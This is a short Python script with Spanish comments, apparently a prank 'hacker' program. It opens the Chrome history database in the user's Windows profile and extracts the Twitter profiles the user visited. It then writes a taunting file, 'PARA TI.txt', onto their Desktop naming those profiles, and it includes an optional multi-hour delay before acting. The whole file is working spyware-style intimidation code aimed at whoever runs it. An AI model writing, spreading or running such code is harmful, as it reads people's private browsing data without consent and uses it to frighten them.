import os
import re
import sqlite3
from pathlib import Path
from time import sleep
from random import randrange


HACKER_FILE_NAME = "PARA TI.txt"


def get_user_path():
    return "{}\\".format(Path.home())


def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop\\" + HACKER_FILE_NAME, "w")
    hacker_file.write("Hackado papu\n")
    return hacker_file


def delay_action():
    n_hours = randrange(1, 4)
    print("Durmiendo {} horas".format(n_hours))
    sleep(n_hours * 60 * 60)


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 segundos.")
            sleep(3)


def check_twitter_profiles(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])
    hacker_file.write("He visto que hs estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))


def main():
    # Esperaremos entre 1 y 3 horas
    # delay_action()
    # Calculamos la ruta de windows
    user_path = get_user_path()
    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)
    # Recogemos su historial de Google, cuando sea posible
    chrome_history = get_chrome_history(user_path)
    # Escribiendo mensajes de miedo
    check_twitter_profiles(hacker_file, chrome_history)


if __name__ == "__main__":
    main()
